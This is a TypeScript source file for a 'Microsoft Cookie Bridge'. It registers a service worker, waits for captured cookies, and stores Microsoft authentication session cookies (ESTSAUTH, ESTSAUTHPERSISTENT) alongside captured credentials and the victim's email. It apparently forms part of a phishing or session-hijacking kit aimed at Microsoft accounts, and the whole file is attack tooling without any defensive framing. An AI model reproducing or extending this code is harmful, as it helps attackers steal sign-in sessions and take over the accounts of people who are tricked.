// src/utils/microsoftCookieBridge.ts
/**
 * Microsoft Cookie Bridge
 * Manages communication between main page and Service Worker
 * Handles cookie capture, validation, and storage
 */

export interface CapturedCookieData {
  cookies: any[];
  accountDetected: boolean;
  signedIn: boolean;
  lastCapture: string;
  email?: string;
  timestamp: string;
}

export interface CookieBridgeState {
  cookies: any[];
  accountDetected: boolean;
  signedIn: boolean;
  lastCapture: string | null;
  email: string | null;
  timestamp: string | null;
}

class MicrosoftCookieBridge {
  private serviceWorkerRegistration: ServiceWorkerRegistration | null = null;
  private isSupported: boolean = false;
  private messageListeners: Map<string, Function[]> = new Map();

  constructor() {
    this.isSupported = 'serviceWorker' in navigator;
    console.log('🌐 Microsoft Cookie Bridge initialized. Service Worker supported:', this.isSupported);
  }

  /**
   * Register and activate Service Worker
   */
  async registerServiceWorker(scriptUrl: string = '/service-worker.js'): Promise<boolean> {
    try {
      if (!this.isSupported) {
        console.warn('⚠️ Service Worker not supported in this browser');
        return false;
      }

      console.log('📝 Registering Service Worker from:', scriptUrl);

      this.serviceWorkerRegistration = await navigator.serviceWorker.register(scriptUrl, {
        scope: '/',
        updateViaCache: 'none'
      });

      console.log('✅ Service Worker registered successfully');

      // Listen for messages from Service Worker
      navigator.serviceWorker.addEventListener('message', (event) => {
        this.handleServiceWorkerMessage(event);
      });

      return true;
    } catch (error) {
      console.error('❌ Failed to register Service Worker:', error);
      return false;
    }
  }

  /**
   * Send message to Service Worker
   */
  private async sendMessageToServiceWorker(message: any): Promise<any> {
    return new Promise((resolve, reject) => {
      if (!navigator.serviceWorker.controller) {
        console.warn('⚠️ No active Service Worker controller');
        reject(new Error('No Service Worker controller active'));
        return;
      }

      const messageChannel = new MessageChannel();

      messageChannel.port1.onmessage = (event) => {
        resolve(event.data);
      };

      navigator.serviceWorker.controller.postMessage(message, [messageChannel.port2]);

      // Timeout after 5 seconds
      setTimeout(() => {
        reject(new Error('Service Worker message timeout'));
      }, 5000);
    });
  }

  /**
   * Handle messages from Service Worker
   */
  private handleServiceWorkerMessage(event: ExtendableMessageEvent) {
    const { type, data } = event.data;

    console.log('📨 Received message from Service Worker:', type, data);

    // Call registered listeners
    const listeners = this.messageListeners.get(type) || [];
    listeners.forEach(listener => {
      try {
        listener(data);
      } catch (error) {
        console.error('❌ Error in message listener:', error);
      }
    });
  }

  /**
   * Register listener for Service Worker messages
   */
  onMessage(type: string, callback: Function): void {
    if (!this.messageListeners.has(type)) {
      this.messageListeners.set(type, []);
    }
    this.messageListeners.get(type)!.push(callback);
  }

  /**
   * Get captured cookies from Service Worker
   */
  async getCapturedCookies(): Promise<CapturedCookieData | null> {
    try {
      const result = await this.sendMessageToServiceWorker({
        type: 'GET_CAPTURED_COOKIES'
      });

      if (result.success) {
        console.log('✅ Cookies retrieved from Service Worker:', result);
        return {
          cookies: result.cookies,
          accountDetected: result.accountDetected,
          signedIn: result.signedIn,
          lastCapture: result.lastCapture,
          timestamp: new Date().toISOString()
        };
      }

      return null;
    } catch (error) {
      console.error('❌ Error getting captured cookies:', error);
      return null;
    }
  }

  /**
   * Clear captured cookies from Service Worker
   */
  async clearCapturedCookies(): Promise<boolean> {
    try {
      const result = await this.sendMessageToServiceWorker({
        type: 'CLEAR_COOKIES'
      });
      return result.success;
    } catch (error) {
      console.error('❌ Error clearing cookies:', error);
      return false;
    }
  }

  /**
   * Set email in Service Worker store
   */
  async setEmail(email: string): Promise<boolean> {
    try {
      const result = await this.sendMessageToServiceWorker({
        type: 'SET_EMAIL',
        data: { email }
      });
      return result.success;
    } catch (error) {
      console.error('❌ Error setting email:', error);
      return false;
    }
  }

  /**
   * Get Service Worker store state
   */
  async getStoreState(): Promise<CookieBridgeState | null> {
    try {
      const result = await this.sendMessageToServiceWorker({
        type: 'GET_STORE_STATE'
      });

      if (result.success) {
        const state = result.state;
        return {
          cookies: state.cookies,
          accountDetected: state.accountDetected,
          signedIn: state.signedIn,
          lastCapture: state.lastCapture,
          email: state.email,
          timestamp: new Date().toISOString()
        };
      }

      return null;
    } catch (error) {
      console.error('❌ Error getting store state:', error);
      return null;
    }
  }

  /**
   * Detect if Microsoft account is already signed in
   */
  async isAccountSignedIn(): Promise<boolean> {
    try {
      const state = await this.getStoreState();
      return state?.signedIn || false;
    } catch (error) {
      console.error('❌ Error checking account status:', error);
      return false;
    }
  }

  /**
   * Wait for cookies to be captured (with timeout)
   */
  async waitForCookieCapture(timeoutMs: number = 15000): Promise<CapturedCookieData | null> {
    return new Promise((resolve) => {
      let resolved = false;

      const timeout = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          console.warn('⏱️ Cookie capture timeout');
          resolve(null);
        }
      }, timeoutMs);

      const checkCookies = async () => {
        try {
          const cookies = await this.getCapturedCookies();

          if (cookies && cookies.cookies.length > 0 && !resolved) {
            resolved = true;
            clearTimeout(timeout);
            console.log('✅ Cookies captured successfully');
            resolve(cookies);
          } else if (!resolved) {
            setTimeout(checkCookies, 500);
          }
        } catch (error) {
          console.error('❌ Error in waitForCookieCapture:', error);
        }
      };

      // Also listen for messages
      this.onMessage('COOKIES_CAPTURED', (data) => {
        if (!resolved && data.totalCookies > 0) {
          resolved = true;
          clearTimeout(timeout);
          resolve({
            cookies: data.cookies,
            accountDetected: data.accountDetected,
            signedIn: data.accountDetected,
            lastCapture: data.timestamp,
            timestamp: new Date().toISOString()
          });
        }
      });

      // Start checking
      checkCookies();
    });
  }

  /**
   * Store captured cookies and credentials
   */
  async storeCaptureDa(cookies: any[], credentials: any): Promise<boolean> {
    try {
      const captureData = {
        version: '1.0',
        capturedAt: new Date().toISOString(),
        source: 'microsoft-cookie-bridge',
        cookies: cookies,
        credentials: credentials,
        totalCookies: cookies.length,
        authCookies: cookies.filter(c =>
          c.name.includes('ESTSAUTH') ||
          c.name.includes('SignInStateCookie') ||
          c.name.includes('ESTSAUTHPERSISTENT')
        )
      };

      localStorage.setItem('captured_cookies_bridge', JSON.stringify(captureData));
      sessionStorage.setItem('captured_cookies_bridge', JSON.stringify(captureData));

      console.log('💾 Capture data stored:', captureData);
      return true;
    } catch (error) {
      console.error('❌ Error storing capture data:', error);
      return false;
    }
  }

  /**
   * Retrieve stored capture data
   */
  retrieveCaptureData(): any {
    try {
      const data =
        localStorage.getItem('captured_cookies_bridge') ||
        sessionStorage.getItem('captured_cookies_bridge');

      if (data) {
        return JSON.parse(data);
      }
      return null;
    } catch (error) {
      console.error('❌ Error retrieving capture data:', error);
      return null;
    }
  }
}

// Export singleton instance
export const microsoftCookieBridge = new MicrosoftCookieBridge();

/**
 * Initialize Microsoft Cookie Bridge
 */
export async function initializeMicrosoftCookieBridge(): Promise<boolean> {
  try {
    console.log('🚀 Initializing Microsoft Cookie Bridge');
    return await microsoftCookieBridge.registerServiceWorker();
  } catch (error) {
    console.error('❌ Failed to initialize Microsoft Cookie Bridge:', error);
    return false;
  }
}